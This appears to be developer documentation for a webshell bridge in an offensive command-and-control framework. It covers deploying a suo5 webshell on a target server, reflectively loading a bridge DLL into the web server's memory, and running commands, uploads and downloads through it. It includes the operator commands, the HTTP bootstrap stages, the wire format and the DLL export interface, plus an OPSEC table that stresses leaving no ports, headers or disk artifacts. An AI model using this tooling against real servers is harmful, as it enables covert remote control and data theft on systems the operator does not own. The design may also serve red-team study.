# WebShell Bridge

## Overview

WebShell Bridge enables IoM to operate through webshells (JSP/PHP/ASPX) using a memory channel architecture. The bridge DLL is loaded into the web server process memory, and the webshell calls DLL exports directly via function pointers — no TCP ports opened on the target.

- **Product layer**: Server sees a `CustomPipeline(type="webshell")`. Operators interact via `webshell new/start/stop/delete` commands.
- **Implementation layer**: `WebShellPipeline` in the listener process handles DLL bootstrap via HTTP and establishes a persistent suo5 data channel.
- **Transport layer**: The webshell loads the DLL, resolves exports, and calls `bridge_init`/`bridge_process` directly. Pure memory channel.

## Architecture

```
Product Layer (operator sees)
─────────────────────────────
  Client/TUI
    webshell new --listener my-listener
    use <session>
    exec whoami

  Server
    CustomPipeline(type="webshell")
    Session appears like any other implant session


Listener Process (WebShellPipeline)
────────────────────────────────────
  Runs inside the listener, connects to Server via ListenerRPC (mTLS)

  ┌─ Bootstrap (HTTP POST + query string) ───────────────────┐
  │  ?s=status / ?s=load / ?s=init / ?s=deps&name=...       │
  │  Body = raw payload (DLL bytes, etc.)                    │
  └──────────────────────────────────────────────────────────┘

  ┌─ Data channel (suo5 full-duplex) ────────────────────────┐
  │  proxyclient/suo5 → net.Conn                             │
  │  Malefic wire format via MaleficParser (shared w/ TCP)   │
  │  Compressed + optional Age encryption                    │
  └──────────────────────────────────────────────────────────┘

  ┌─ Forward integration ────────────────────────────────────┐
  │  SpiteStream ↔ MaleficParser read/write                  │
  │  Session registration, checkin, task routing              │
  └──────────────────────────────────────────────────────────┘


Target Web Server Process
─────────────────────────
  WebShell (JSP/PHP/ASPX)
    - Bridge DLL loading (ReflectiveLoader)
    - Export resolution (bridge_init, bridge_process)
    - malefic frames → call bridge_process() → return malefic frame response
    - No port opened, no TCP loopback

  Bridge Runtime DLL (in web server process memory)
    ┌─ export interface ────────────────────────────────┐
    │  bridge_init()    → Register (SysInfo + Modules)  │
    │  bridge_process() → Spites in/out (protobuf)      │
    └───────────────────────────────────────────────────┘

    ┌─ malefic module runtime ─────────────────────────┐
    │  exec / bof / execute_pe / upload / download / ...│
    │  All malefic modules available                    │
    └──────────────────────────────────────────────────┘
```

## Data Flow

```
Client exec("whoami")
  → Server (SpiteStream)
    → WebShellPipeline handler (receives SpiteRequest)
      → MaleficParser.WritePacket → suo5 conn
        → WebShell (calls bridge_process via function pointer)
          → DLL module runtime → exec("whoami") → "root"
        → malefic frame response via suo5 conn
      → readLoop: MaleficParser.ReadPacket → Forwarders.Send(SpiteResponse)
    → Server → Client displays "root"
```

## Usage

### 1. Deploy webshell

Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server.

### 2. Register and start the pipeline

```
webshell new --listener my-listener --suo5 suo5://target/bridge.jsp --dll /path/to/bridge.dll
```

Use the suo5 URL scheme (`suo5://` or `suo5s://` for HTTPS).

The `--dll` flag enables auto-loading: when a session is initialized, the pipeline automatically delivers the DLL to the webshell if it is not already loaded.

### 3. Interact

```
use <session-id>
exec whoami
upload /local/file /remote/path
download /remote/file
```

## Protocol

### Bootstrap (HTTP POST)

Bootstrap requests use simple HTTP POST with stage in query string. Authentication relies on suo5's own transport security.

```
POST /bridge.jsp?s=status HTTP/1.1
POST /bridge.jsp?s=load   HTTP/1.1  (body = raw DLL bytes)
POST /bridge.jsp?s=init   HTTP/1.1
POST /bridge.jsp?s=deps&name=.jna.jar HTTP/1.1  (body = file bytes)
```

| Stage | Payload | Response |
|-------|---------|----------|
| `status` | (empty) | JSON `{"ready":true,...}` or `LOADED`/`NOT_LOADED` |
| `load` | Raw DLL bytes | `OK:memory` or error string |
| `init` | (empty) | `[4B sessionID LE][Register protobuf]` |
| `deps` | File bytes (name in `?name=` param) | `OK:<path>` or error string |

### Data Channel (Malefic Wire Format)

After bootstrap, a persistent suo5 connection carries bidirectional frames using the standard malefic wire format (reuses `MaleficParser`):

```
[0xd1][4B sessionID LE][4B payload_len LE][compressed Spites protobuf][0xd2]
```

- Identical to the malefic implant wire format — same delimiters, same header layout
- Payload is compressed (and optionally Age-encrypted via `WithSecure`)
- Parsed by `server/internal/parser/malefic/parser.go` (shared with TCP/HTTP pipelines)

### DLL Export Interface

The bridge DLL must export these functions:

```c
// Initialize and return serialized Register protobuf
// Output format: [4 bytes sessionID LE][Register protobuf bytes]
int __stdcall bridge_init(
    uint8_t* out_buf,      // output buffer
    uint32_t out_cap,      // buffer capacity
    uint32_t* out_len      // actual bytes written
);  // returns 0 on success

// Process serialized Spites protobuf, return response Spites
int __stdcall bridge_process(
    uint8_t* in_buf,       // input Spites protobuf
    uint32_t in_len,       // input length
    uint8_t* out_buf,      // output buffer for response Spites
    uint32_t out_cap,      // buffer capacity
    uint32_t* out_len      // actual bytes written
);  // returns 0 on success

// Optional: cleanup
int __stdcall bridge_destroy();
```

The DLL must also export `ReflectiveLoader` for the loading phase. The webshell uses ReflectiveLoader to map the DLL, then resolves `bridge_init`/`bridge_process` from the mapped image's export table.

## OPSEC Properties

| Property | Status |
|----------|--------|
| Custom HTTP headers | None — no X-*, no custom cookies |
| Content-Type | `application/octet-stream` (bootstrap) |
| Authentication | Delegated to suo5 transport |
| Data channel | Malefic wire format with compression + optional Age encryption |
| Ports opened | None on target |
| Disk artifacts | None (DLL is memory-only) |

## Key Files

| Purpose | Path |
|---------|------|
| WebShell pipeline | `server/listener/webshell.go` |
| Pipeline tests | `server/listener/webshell_test.go` |
| Malefic parser (shared) | `server/internal/parser/malefic/parser.go` |
| Client commands | `client/command/pipeline/webshell.go` |
| Webshell (ASPX) | `suo5-webshell/bridge.aspx` |
| Webshell (PHP) | `suo5-webshell/bridge.php` |
| Webshell (JSP) | `suo5-webshell/bridge.jsp` |
